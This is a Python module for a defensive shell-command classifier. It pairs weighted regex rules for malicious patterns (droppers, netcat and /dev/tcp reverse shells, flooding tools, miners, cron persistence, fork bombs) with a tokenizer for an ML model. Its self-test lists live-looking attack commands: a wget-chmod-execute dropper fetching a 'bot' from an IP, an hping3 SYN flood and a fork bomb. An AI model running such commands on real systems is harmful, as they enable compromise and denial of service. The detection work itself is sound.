"""
Command feature extraction + rule/IOC scoring for the ConPoint command classifier.

Two layers, combined at inference time:
  * rule_score(cmd)  -> high-precision, explainable IOC matches (returns 0..1 + reasons)
  * tokenize(cmd)    -> normalized tokens for the TF-IDF ML model

The ML model (train_command_clf.py) generalizes beyond the rules; the rule layer
guarantees that well-known DDoS-bot / dropper patterns are always flagged and gives
the analyst a human-readable justification for the report.
"""
from __future__ import annotations

import re
from typing import List, Tuple

# (regex, weight, human-readable reason)
_RULES = [
    (r"\b(wget|curl|tftp)\b.*\|\s*(sh|bash)", 0.9, "download piped directly to shell"),
    (r"\b(wget|curl|tftp)\b.*&&.*chmod\s+\+x", 0.9, "download + chmod +x (dropper)"),
    (r"chmod\s+\+x\s+/(tmp|dev/shm|var/tmp)/", 0.7, "made file in temp dir executable"),
    (r"base64\s+-d.*\|\s*(sh|bash)", 0.9, "base64-decoded payload piped to shell"),
    (r"\b(nc|ncat)\b.*-e\b", 0.9, "netcat reverse shell (-e)"),
    (r"/dev/tcp/\d", 0.9, "bash /dev/tcp reverse shell"),
    (r"\bbash\s+-i\b", 0.6, "interactive bash (possible reverse shell)"),
    (r"\b(hping3|mausezahn|t50|slowloris|goldeneye|hulk)\b", 0.95, "known flooding tool"),
    (r"\bab\s+-n\s+\d{4,}", 0.7, "apachebench high-volume flood"),
    (r"\b(xmrig|minerd|stratum\+tcp)\b", 0.9, "crypto-miner"),
    (r"\b(mirai|gafgyt|bashlite|tsunami|xorddos)\b", 0.95, "known bot family string"),
    (r"(crontab|/etc/rc\.local|/etc/cron)", 0.6, "persistence via cron/rc.local"),
    (r"\b(iptables|ufw)\b.*(-F|disable|stop)", 0.6, "firewall being disabled"),
    (r">\s*/dev/null\s+2>&1\s*&\s*$", 0.3, "backgrounded + output suppressed"),
    (r"\bkill(all)?\b.*(-9)?\s+(sshd|systemd-journald)?", 0.4, "killing daemons"),
    (r"for\s*\(\(.*\)\).*done", 0.4, "shell flood loop"),
    (r":\(\)\s*\{\s*:\|:&\s*\};:", 1.0, "fork bomb"),
]
_COMPILED = [(re.compile(p, re.IGNORECASE), w, r) for p, w, r in _RULES]

_TOKEN_RE = re.compile(r"[A-Za-z0-9_./+-]+")


def rule_score(cmd: str) -> Tuple[float, List[str]]:
    """Return (score in 0..1, list of matched reasons)."""
    score = 0.0
    reasons: List[str] = []
    for rx, w, reason in _COMPILED:
        if rx.search(cmd):
            score = max(score, w)      # take strongest single signal
            reasons.append(reason)
    return score, reasons


def tokenize(cmd: str) -> List[str]:
    """Normalize a command into tokens for TF-IDF (paths/ips/nums generalized)."""
    cmd = re.sub(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", "IPADDR", cmd)
    cmd = re.sub(r"https?://\S+", "URL", cmd)
    cmd = re.sub(r"\b\d{3,}\b", "NUM", cmd)
    return _TOKEN_RE.findall(cmd.lower())


def normalize(cmd: str) -> str:
    return " ".join(tokenize(cmd))


if __name__ == "__main__":
    tests = [
        "wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x",
        "nginx -g daemon off;",
        "hping3 --flood -S -p 80 10.0.0.5",
        "ls -la /var/log",
        ":(){ :|:& };:",
    ]
    for t in tests:
        s, why = rule_score(t)
        print(f"{s:.2f}  {t}\n      -> {why}\n      norm: {normalize(t)}")
